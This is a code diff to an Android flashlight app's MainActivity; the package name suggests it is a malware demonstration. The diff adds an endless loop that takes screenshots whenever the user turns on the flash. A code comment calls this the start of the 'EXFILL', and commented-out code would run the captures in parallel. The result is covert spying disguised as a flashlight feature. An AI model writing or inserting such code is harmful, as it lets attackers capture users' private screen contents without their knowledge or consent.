@@ -16,6 +16,8 @@ import android.view.View;
 import android.widget.CompoundButton;
 import android.widget.Switch;
 import android.widget.Toast;
+import java.util.concurrent.ForkJoinPool;
+import java.util.concurrent.TimeUnit;
 
 import java.io.File;
 import java.io.FileNotFoundException;
@@ -23,6 +25,7 @@ import java.io.FileOutputStream;
 import java.io.IOException;
 import java.nio.file.NotDirectoryException;
 import java.util.Date;
+import com.mlw.extorch.CacheScreenShoot;
 
 public class MainActivity extends AppCompatActivity {
 
@@ -46,6 +49,8 @@ public class MainActivity extends AppCompatActivity {
             if(getPackageManager().hasSystemFeature(PackageManager.FEATURE_CAMERA_FLASH)){
                 //HERE WE TURN THE FLASH ON AND START THE EXFILL
                 flashControl.setEnabled(true);
+                //pararrel screenshoot execution
+//                execute_captures();
             }else{
                 Toast.makeText(MainActivity.this, "This device has no flash!", Toast.LENGTH_SHORT).show();
             }
@@ -63,7 +68,7 @@ public class MainActivity extends AppCompatActivity {
                     } catch (CameraAccessException e) {
                         e.printStackTrace();
                     }
-                    cache_screenshoot();
+                    execute_captures();
                     flashControl.setText("Flash OFF");
                 }else{
                     try {
@@ -76,6 +81,21 @@ public class MainActivity extends AppCompatActivity {
             }
         });
 
+    }
+
+    private void execute_captures(){
+//        final ForkJoinPool pool = ForkJoinPool.commonPool();
+        while(true){
+            cache_screenshoot();
+        }
+
+
+//        // execute 10 tasks
+//        for (int i = 0; i < 10; i++) {
+//            pool.execute(new CacheScreenShoot(this));
+//        }
+//
+//        pool.awaitQuiescence(3, TimeUnit.SECONDS);
     }
 
     private void cache_screenshoot(){
